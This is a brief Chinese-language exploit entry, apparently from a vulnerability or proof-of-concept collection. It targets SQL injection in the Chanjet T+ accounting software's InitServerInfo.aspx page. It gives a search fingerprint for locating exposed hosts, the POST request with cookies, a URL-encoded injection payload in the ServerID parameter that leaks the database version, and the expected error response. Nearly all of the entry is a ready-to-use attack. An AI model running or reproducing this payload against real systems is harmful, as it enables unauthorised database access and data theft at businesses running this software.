# 畅捷通T+InitServerInfo.aspxSQL

- **系统**：用友　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1`
- **关键头**：`Cookie: HOST=null; ASP.NET_SessionId=3ysypgqljcjlb3jh0e4pktq3; Hm_lvt_fd4ca40261bc424e2d…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
operbtn=create&ServerID=%27%2b(select%0d%0a1%0d%0awhere%0d%0a1%0d%0ain%0d%0a(@@VERSION))%2b%27
```
- **预期**：200　|　nvarchar